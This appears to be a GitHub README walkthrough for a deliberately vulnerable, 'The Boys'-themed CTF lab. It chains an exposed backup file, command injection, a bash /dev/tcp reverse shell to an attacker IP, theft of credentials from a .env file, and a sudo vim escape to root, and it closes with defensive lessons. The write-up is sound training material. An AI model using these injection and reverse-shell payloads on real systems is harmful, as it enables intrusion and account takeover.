# 🦸 Vought-Labs: Breach-Protocol

> A beginner-friendly vulnerable CTF lab inspired by **The Boys**, designed to demonstrate a realistic attack chain from external reconnaissance to **full system compromise**.

---

## 📌 Overview

**Vought-Labs: Breach-Protocol** is a beginner-friendly Capture The Flag (CTF) machine focused on common web and Linux security vulnerabilities.

The objective is to start as an external attacker and progress through multiple stages:

```text
Reconnaissance
      ↓
Web Enumeration
      ↓
Sensitive Data Exposure
      ↓
Authentication
      ↓
Command Injection
      ↓
Initial Shell
      ↓
Credential Discovery
      ↓
Lateral Movement
      ↓
Privilege Escalation
      ↓
Root Access
```

The lab demonstrates how seemingly small security mistakes can be chained together to completely compromise a system.

---

## 🎯 Learning Objectives

By completing this lab, you will practice:

* 🔎 Network reconnaissance
* 🌐 Web enumeration
* 📂 Directory brute-forcing
* 🔍 Source-code analysis
* 🔐 Credential discovery
* 💻 Command injection
* 🐚 Reverse shell techniques
* 📁 Linux file enumeration
* 🔄 Lateral movement
* 🛡️ Sudo enumeration
* ⬆️ Linux privilege escalation
* 👑 Root access

---

## 🛠️ Tools Used

| Tool       | Purpose                          |
| ---------- | -------------------------------- |
| `Nmap`     | Port and service enumeration     |
| `Gobuster` | Web directory enumeration        |
| `Netcat`   | Reverse shell listener           |
| `Bash`     | Shell interaction                |
| `find`     | Searching for sensitive files    |
| `su`       | User switching                   |
| `sudo`     | Privilege escalation enumeration |
| `Vim`      | Exploiting sudo misconfiguration |

---

# 🚩 Walkthrough

> ⚠️ **Spoiler Warning:**
> The following section contains the complete solution, including credentials and flags.

---

## Step 1 — Reconnaissance

Every attack starts by understanding what is exposed.

Run an Nmap scan against the target:

```bash
nmap -sC -sV -O <TARGET_IP>
```

### Results

The scan revealed:

* **Port 80** → Web Server
* **Port 22** → SSH

![Nmap Scan](https://cdn-images-1.medium.com/max/1000/1*5ZZYknLlzQB-GStTx1tSGA.png)

The web server on port 80 became the primary target for further enumeration.

---

## Step 2 — Web Enumeration

Opening the website displays a clean-looking corporate page.

![Vought-Labs Website](https://cdn-images-1.medium.com/max/1000/1*4rE9kb0v2DoP_2Z111O5fw.png)

However, attackers shouldn't rely only on what is visible through the browser.

Inspecting the page source revealed an interesting comment:

```html
<!-- TODO: remove /backup/ before production -->
```

This immediately suggests the existence of a potentially sensitive `/backup/` directory.

### Directory Enumeration

We can also enumerate directories using Gobuster:

```bash
gobuster dir -u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

![Gobuster](https://cdn-images-1.medium.com/max/1000/1*nY0bcTDVxVoZueOw9YPV8Q.png)

`robots.txt` did not reveal anything useful.

However, directory enumeration revealed a **portal** directory.

Navigating to:

```text
http://<TARGET_IP>/portal/
```

revealed a login page.

![Portal Login](https://cdn-images-1.medium.com/max/1000/1*RQS2S9GFdghusRt_ycGkVA.png)

We now need to discover valid credentials.

---

## Step 3 — Sensitive Data Exposure

Remember the `/backup/` directory discovered during enumeration.

Navigate to:

```text
http://<TARGET_IP>/backup/
```

A backup file named:

```text
notes.bak
```

was exposed.

![Backup File](https://cdn-images-1.medium.com/max/1000/1*Y131HKdiBEil1YLYJ9pebQ.png)

The file contained valid credentials:

```text
Username: a-train
Password: TurboRush2024
```

### Vulnerability

This is an example of **Sensitive Data Exposure** caused by leaving a backup file accessible from the web server.

---

## Step 4 — Gaining Portal Access

Using the discovered credentials, we can authenticate to the portal:

```text
Username: a-train
Password: TurboRush2024
```

![Portal](https://cdn-images-1.medium.com/max/1000/1*bjx1HkAXkTt_fzYsHUwsNQ.png)

After logging in, we discover a **diagnostics tool** capable of pinging a host.

This functionality is worth investigating because user-controlled input is being passed to a system command.

---

## Step 5 — Command Injection

Let's test whether the input is properly sanitized.

We can append an additional command:

```bash
127.0.0.1; id
```

![Command Injection](https://cdn-images-1.medium.com/max/1000/1*aT9Ufk4tkFTvv2OOdTMqvQ.png)

The response contains:

```text
uid=33(www-data)
```

This confirms that our additional command was executed by the server.

### 🚨 Vulnerability Confirmed

The diagnostics functionality is vulnerable to **OS Command Injection**.

The application effectively allows attacker-controlled input to reach a system shell.

---

## Step 6 — Obtaining a Reverse Shell

With command execution confirmed, we can attempt to obtain an interactive shell.

First, start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Then use the command injection vulnerability to execute a reverse-shell payload:

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

![Reverse Shell Payload](https://cdn-images-1.medium.com/max/1000/1*suVELGbLWmXcOgoiXaJjIw.png)

The listener receives the connection:

![Reverse Shell](https://cdn-images-1.medium.com/max/1000/1*imxJ_s5X6-P1zfbU-3DJ5g.png)

We now have shell access as:

```text
www-data
```

---

## Step 7 — Finding the User Flag

After obtaining initial access, the next step is local enumeration.

Looking through the `/home` directory revealed several users:

```text
MM/
frenchie/
hughie/
kimiko/
starlight/
```

Further enumeration revealed:

```text
starlight/user.txt
```

![User Flag](https://cdn-images-1.medium.com/max/1000/1*1idPOaFRGgpom6ucBO2kUA.jpeg)

The user flag can be retrieved with:

```bash
cat /home/starlight/user.txt
```

🎉 **User flag obtained!**

---

## Step 8 — Post-Exploitation Enumeration

Now that we have a foothold, we need to look for credentials and configuration files.

One useful technique is searching for `.env` files:

```bash
find / -name ".env" 2>/dev/null
```

The search revealed:

```text
/opt/internal/.env
```

Inspecting the file revealed credentials belonging to the `starlight` user.

![Environment File](https://cdn-images-1.medium.com/max/1000/1*Z5PUaVgFPs2LZREtB0vpbw.jpeg)

### Security Issue

Environment files can contain sensitive information such as:

* Database credentials
* API keys
* Application secrets
* User passwords

They should never be unnecessarily exposed to low-privileged users.

---

## Step 9 — Lateral Movement

Using the discovered credentials, switch to the `starlight` account:

```bash
su starlight
```

Enter the discovered password.

If successful, we now have a shell as:

```text
starlight
```

We have successfully performed **lateral movement** from the low-privileged `www-data` account to a legitimate local user.

---

## Step 10 — Privilege Escalation Enumeration

The next step is checking whether the current user has any special sudo permissions.

Run:

```bash
sudo -l
```

![Sudo Permissions](https://cdn-images-1.medium.com/max/1000/1*jITjkUW4ydBxVPX2GAK8cA.jpeg)

The output shows that `vim` can be executed with elevated privileges.

This is dangerous because Vim can execute external system commands.

---

## Step 11 — Root Access

Since Vim is allowed to run through `sudo`, we can use its command execution functionality to spawn a shell:

```bash
sudo vim -c ':!/bin/bash'
```

A root shell is obtained.

Verify the current user:

```bash
whoami
```

Expected result:

```text
root
```

👑 **Root access obtained!**

---

## Step 12 — Root Flag

Finally, read the root flag:

```bash
cat /root/root.txt
```

![Root Flag](https://cdn-images-1.medium.com/max/1000/1*0V3p3ppGxFynBFx9MH8Fhw.jpeg)

🎉 **Congratulations — you have completely compromised Vought-Labs!**

---

# 🔗 Full Attack Chain

The complete attack path can be summarized as:

```text
Nmap
  │
  ▼
Web Server
  │
  ▼
Source Code Enumeration
  │
  ▼
/backup/ Directory
  │
  ▼
notes.bak
  │
  ▼
Leaked Credentials
  │
  ▼
/portal/ Login
  │
  ▼
Command Injection
  │
  ▼
Reverse Shell
  │
  ▼
www-data
  │
  ▼
.env File
  │
  ▼
starlight Credentials
  │
  ▼
Lateral Movement
  │
  ▼
sudo -l
  │
  ▼
Vim Sudo Misconfiguration
  │
  ▼
Root Shell
  │
  ▼
/root/root.txt
```

---

# 🔑 Credentials Discovered

| Username    | Password          | Location             |
| ----------- | ----------------- | -------------------- |
| `a-train`   | `TurboRush2024`   | `/backup/notes.bak`  |
| `starlight` | *Found in `.env`* | `/opt/internal/.env` |

> **Note:** These credentials are intentionally included because this repository documents a deliberately vulnerable CTF lab.

---

# 🏴 Flags

| Flag      | Location                   |
| --------- | -------------------------- |
| User Flag | `/home/starlight/user.txt` |
| Root Flag | `/root/root.txt`           |

The actual flag values are intentionally not reproduced here.

---

# 🛡️ Vulnerabilities Demonstrated

### 1. Information Disclosure

A source-code comment revealed the location of a backup directory.

### 2. Exposed Backup File

A `.bak` file was publicly accessible and contained credentials.

### 3. OS Command Injection

The diagnostics functionality allowed attacker-controlled input to execute arbitrary system commands.

### 4. Sensitive Credentials in `.env`

Application credentials were stored in an accessible environment file.

### 5. Sudo Misconfiguration

The `starlight` user was allowed to execute Vim with elevated privileges.

### 6. Privilege Escalation

The Vim sudo permission could be abused to execute a shell with root privileges.

---

# 🧠 Key Takeaways

This lab demonstrates how multiple small security weaknesses can be chained into a complete compromise.

### 🔎 1. Don't Ignore Small Clues

Comments, backup files, source code and forgotten directories can expose valuable information.

### 📂 2. Never Leave Backup Files Publicly Accessible

Files such as:

```text
.bak
.old
.zip
.tar
.sql
```

may contain sensitive information and should not be accessible from production web servers.

### 🔐 3. Protect Credentials

Credentials should never be exposed through publicly accessible files or poorly protected configuration files.

### 💻 4. Validate User Input

System commands should never directly consume unsanitized user input.

Use strict input validation and safe APIs instead of passing user input directly to shell commands.

### 🛡️ 5. Review Sudo Permissions

Users should only receive the minimum privileges required for their jobs.

Allowing powerful applications such as editors to run as root can result in complete system compromise.

---

# 📚 Skills Practiced

```text
Network Enumeration
Web Enumeration
Directory Brute-Forcing
Source Code Analysis
Credential Discovery
Command Injection
Reverse Shells
Linux Enumeration
Lateral Movement
Sudo Enumeration
Privilege Escalation
Post-Exploitation
CTF Methodology
```

---

# ⚠️ Disclaimer

This project and walkthrough are intended **strictly for educational purposes and authorized security testing**.

Do not attempt these techniques against systems, applications, networks, or accounts without explicit permission from the owner.

The vulnerabilities demonstrated in this lab are intentionally introduced for cybersecurity education and CTF practice.

---

# 👤 Author

**Abdul Aris**

Cybersecurity Enthusiast | Security+ Certified | Blue Team & Offensive Security Learner

Interested in:

* SOC / Blue Team
* Penetration Testing
* Web Application Security
* Vulnerability Research
* CTFs
* Security Labs

---

⭐ If you found this project useful, consider giving the repository a **star**!
